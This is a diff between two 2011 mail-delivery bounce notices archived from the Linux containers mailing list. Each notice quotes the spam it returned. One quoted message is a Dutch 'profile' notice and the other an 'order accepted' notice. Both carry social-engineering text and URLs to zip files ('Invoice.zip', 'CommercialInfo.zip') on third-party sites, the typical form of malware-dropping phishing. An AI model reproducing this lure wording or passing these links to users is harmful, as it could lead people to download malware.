@@ -1,10 +1,9 @@
-From: Mail Administrator <Postmaster-V0Wh+yBzi0RpLGFMi4vTTA@public.gmane.org>
-Subject: Mail System Error - Returned Mail
-Date: Wed, 30 Nov 2011 21:21:10 +0000
-Message-ID: <20111130212110.PWGD1385.nskntmtas04p.mx.bigpond.com@nskntmtas04p>
-Reply-To: Postmaster-V0Wh+yBzi0RpLGFMi4vTTA@public.gmane.org
+From: MAILER-DAEMON-n2LpIuEbe7tHOSrDEvhpxA@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Wed, 30 Nov 2011 23:39:14 +0100 (CET)
+Message-ID: <20111130223914.05E847B955@vs1.remotion.nl>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============8786405309069085033=="
+Content-Type: multipart/mixed; boundary="===============2123481954456322390=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,87 +17,108 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
+This is a MIME-encapsulated message.
 
---===============8786405309069085033==
-Content-Type: multipart/report;
-		report-type=delivery-status;
-		Boundary="===========================_ _= 8271484(1385)1322688070"
+--===============2123481954456322390==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="AA784C0D73.1322692754/vs1.remotion.nl"
+Content-Transfer-Encoding: 7bit
 
+This is a MIME-encapsulated message.
 
---===========================_ _= 8271484(1385)1322688070
-Content-Type: text/plain
+--AA784C0D73.1322692754/vs1.remotion.nl
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-This Message was undeliverable due to the following reason:
+This is the mail system at host vs1.remotion.nl.
 
-Each of the following recipients was rejected by a remote mail server.
-The reasons given by the server are included to help you determine why
-each recipient was rejected.
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-    Recipient: <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>
-    Reason:    5.3.0 <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>... Relaying denied
+For further assistance, please send mail to postmaster.
 
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
 
-Please reply to <Postmaster-V0Wh+yBzi0RpLGFMi4vTTA@public.gmane.org>
-if you feel this message to be in error.
+                   The mail system
 
---===========================_ _= 8271484(1385)1322688070
+<069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org>: Host or domain name not found. Name service
+    error for name=wws.nl type=A: Host not found
+
+--AA784C0D73.1322692754/vs1.remotion.nl
+Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; nskntmtas04p.mx.bigpond.com
-Arrival-Date: Wed, 30 Nov 2011 21:21:05 +0000
-Received-From-MTA: dns; nskntotgx02p.mx.bigpond.com (173.203.205.227)
+Reporting-MTA: dns; vs1.remotion.nl
+X-Postfix-Queue-ID: AA784C0D73
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Wed, 30 Nov 2011 05:38:50 +0100 (CET)
 
-Final-Recipient: RFC822; <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>
+Final-Recipient: rfc822; 069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org
+Original-Recipient: rfc822;069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org
 Action: failed
-Status: 5.1.3
-Remote-MTA: dns; mx2.xs4all.nl (194.109.24.138)
-Diagnostic-Code: smtp; 553 5.3.0 <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>... Relaying denied
+Status: 5.4.4
+Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error
+    for name=wws.nl type=A: Host not found
 
---===========================_ _= 8271484(1385)1322688070
+--AA784C0D73.1322692754/vs1.remotion.nl
+Content-Description: Undelivered Message
 Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
 
-Received: from nskntotgx02p.mx.bigpond.com ([173.203.205.227])
-          by nskntmtas04p.mx.bigpond.com with ESMTP
-          id <20111130212105.PWCA1385.nskntmtas04p.mx.bigpond.com-E1fquxLL3QOV5u0nuDzcY28xiP4SpHYEQQ4Iyu8u01E@public.gmane.org>
-          for <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>; Wed, 30 Nov 2011 21:21:05 +0000
-Received: from cg2 ([173.203.205.227]) by nskntotgx02p.mx.bigpond.com
-          with ESMTP
-          id <20111130212104.NHVE17136.nskntotgx02p.mx.bigpond.com@cg2>
-          for <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>; Wed, 30 Nov 2011 21:21:04 +0000
-Received: from [173.203.205.227] by cg2 id Af706HWvxLZyT; Wed, 30 Nov 2011 21:21:01 +0000
-Message-ID: <001b01ccafa5$f31b0280$0500a8c0@cg2>
-From: "Inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <a-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org>
-Subject: Request id: 24097
-Date: Wed, 30 Nov 2011 21:21:01 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by vs1.remotion.nl (Postfix) with ESMTP id AA784C0D73
+	for <069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org>; Wed, 30 Nov 2011 05:38:50 +0100 (CET)
+X-Virus-Scanned: by AMaViS (vs1.remotion.nl) at vs1.remotion.nl 
+X-Spam-Flag: NO
+X-Spam-Score: 2.355
+X-Spam-Level: **
+X-Spam-Status: No, score=2.355 tagged_above=-9999 required=8
+	tests=[FORGED_MUA_THEBAT_CS=0.854, RCVD_IN_PBL=0.509, SPF_FAIL=0.992]
+	autolearn=no
+Received: from vs1.remotion.nl ([127.0.0.1])
+	by localhost (vs1.remotion.nl [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id kRWyDfKUhtwm for <069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org>;
+	Wed, 30 Nov 2011 05:38:48 +0100 (CET)
+Received: from cg2 (173-203-205-227.static.cloud-ips.com [173.203.205.227])
+	by vs1.remotion.nl (Postfix) with ESMTP id 28B2CC0D6A
+	for <069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org>; Wed, 30 Nov 2011 05:38:47 +0100 (CET)
+Received: from [173.203.205.227] by cg2 id 2Lhwf1e7AlYA with SMTP; Wed, 30 Nov 2011 04:38:47 +0000
+Date: Wed, 30 Nov 2011 04:38:47 +0000
+From: "INCo Group" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v2.06.6) Home
+X-Priority: 3 (Normal)
+Message-ID: <46974285.16376746342560@cg2>
+To: <069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org>
+Subject: Re: adviser  id: 22989235.
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-Authentication-Info: Submitted using SMTP AUTH LOGIN at nskntotgx02p.mx.bigpond.com from [173.203.205.227] using ID lbrighton-bzGI/hKkdgRBDgjK7y7TUQ@public.gmane.org at Wed, 30 Nov 2011 21:21:03 +0000
 Content-Transfer-Encoding: quoted-printable
 
 
 
-Guten Morgen
+Gruss Gott 069838675.90628606626155
 
 
-Het antwoord op uw vraag over het profiel op onze website 22.11.2011.
+Your order has been accepted.
 
-Dagelijks kunt u hier vinden:
-http://leclostanpere.fr/docdown/Invoice.zip?idinvoice=3D10576748750240Fir=
-ma=3Da-cfarm-h/zCm0QUZnlZiXb3D+6dPA@public.gmane.org
+Order id: 959480.
 
+Terms of delivery and the date can be found with the auto-generated mswor=
+d file
+located at:
+http://scooternos.net/docdown/CommercialInfo.zip?idinvoice=3D8892437Firma=
+=3D069838675.90628606626155-Edmwl0KJvzQ@public.gmane.org
 
-***
-We zullen blij zijn om samen te werken in de toekomst.
-Tel./Fax.: +31 (0)78 001 24 59.
-
-
-
---===========================_ _= 8271484(1385)1322688070--
+=3D=3D
+Tel./Fax.: +31 (0)78 379 02 91.
 
 
---===============8786405309069085033==
+
+--AA784C0D73.1322692754/vs1.remotion.nl--
+
+--===============2123481954456322390==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -108,4 +128,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============8786405309069085033==--
+--===============2123481954456322390==--
